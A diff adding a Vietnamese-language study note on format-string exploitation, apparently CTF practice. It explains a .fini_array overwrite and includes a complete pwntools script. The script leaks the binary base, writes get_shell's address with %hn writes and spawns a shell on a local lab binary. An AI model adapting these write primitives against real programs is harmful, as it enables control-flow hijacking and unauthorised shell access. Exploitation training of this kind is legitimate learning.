@@ -71,4 +71,87 @@ p.interactive()
 [FMT_Xmaster.md](https://github.com/wan-hyhty/trainning/blob/task3/FMT/FMT_Xmaster.md)
 
 # Tấn công GOT 
-[xFMasTree.md](https://github.com/wan-hyhty/trainning/blob/task3/FMT/xFMasTree.md)
+[xFMasTree.md](https://github.com/wan-hyhty/trainning/blob/task3/FMT/xFMasTree.md)  
+
+# Tấn công .fini_array  
+
+đặc điểm nhận dạng: con trỏ không phải địa chỉ stack, hay binary, như lại trỏ đến địa chỉ là base của binary, gần biến môi trường  
+.fini_array: là mảng, chứa địa chỉ để thực thi khi chương trình exit, khi đó chương trình sẽ lấy địa chỉ base + với offset để thực thi  
+  
+Nhiệm vụ của chúng ta là thay đổi địa chỉ con trỏ trỏ đến địa chỉ mới  
+Đầu tiên tìm offset fini_array: dùng info files  
+bước 2 leak exe  
+bước 3 kiểm tra vùng read write, viết địa chỉ hàm get_shell vào vùng địa chỉ đó  
+Ở đây ta chú ý  
+```python
+# offset từ vị trí ta viết hàm shell và base 0x40e0
+package = {
+    exe.sym['get_shell'] >> 0 & 0xffff: exe.address + 0x40e0,       #lấy 2 byte đầu, gán exe.address + 0x40e0
+    exe.sym['get_shell'] >> 16 & 0xffff: exe.address + 0x40e0+2,
+    exe.sym['get_shell'] >> 32 & 0xffff: exe.address + 0x40e0+4,
+}
+order = sorted(package) #sắp xếp giá trị để khi %c ta sẽ chỉ cần cộng từ nhở đến lớn
+
+payload2 = f'%{order[0]}c%13$hn'.encode()               #ở đây payload sẽ lấy order 0 được gán giá trị  exe.address + 0x40e0
+payload2 += f'%{order[1] - order[0]}c%14$hn'.encode()
+payload2 += f'%{order[2] - order[1]}c%15$hn'.encode()
+payload2 = payload2.ljust(64 - 24, b'a')
+payload2 += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
+```
+<details> <summary> script </summary>
+  
+  ```python
+  from pwn import *
+
+exe = ELF('./fmtstr8_patched', checksec=False)
+libc = ELF("libc-2.31.so", checksec=False)
+p = process(exe.path)
+gdb.attach(p, gdbscript='''
+           b* main+136
+           c
+           ''')
+input()
+
+# offset fini_array = 0x3d90
+
+### Leak binary ###
+payload1 = b"%23$p"
+p.sendlineafter(b"something: ", payload1)
+p.recvuntil(b"said: ")
+leak_exe = int(p.recvline(keepends=False), 16)
+exe.address = leak_exe - exe.sym['main']
+p.sendlineafter(b"> ", b'n')
+log.info("leak exe: " + hex(leak_exe))
+log.info("base exe: " + hex(exe.address))
+
+### viet ham get_shell ###
+# offset 0x40e0
+package = {
+    exe.sym['get_shell'] >> 0 & 0xffff: exe.address + 0x40e0,
+    exe.sym['get_shell'] >> 16 & 0xffff: exe.address + 0x40e0+2,
+    exe.sym['get_shell'] >> 32 & 0xffff: exe.address + 0x40e0+4,
+}
+order = sorted(package)
+
+payload2 = f'%{order[0]}c%13$hn'.encode()
+payload2 += f'%{order[1] - order[0]}c%14$hn'.encode()
+payload2 += f'%{order[2] - order[1]}c%15$hn'.encode()
+payload2 = payload2.ljust(64 - 24, b'a')
+payload2 += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
+print(package)
+print(order)
+p.sendlineafter(b'something: ', payload2)
+p.sendlineafter(b"> ", b'n')
+### fini_array ###
+# 0x00564529b7b000 + x + 0x3d90 = 0x564529b7f0e0 
+# 0x564529b7f0e0 - 0x3d90 - 0x00564529b7b000 = 0x350
+payload3 = f'%{(exe.address + 0x350) & 0xffff}c%38$hn'.encode()
+
+p.sendlineafter(b'something: ', payload3)
+p.sendlineafter(b"> ", b'y')
+p.interactive()
+
+  ```
+  
+  </details>
+  
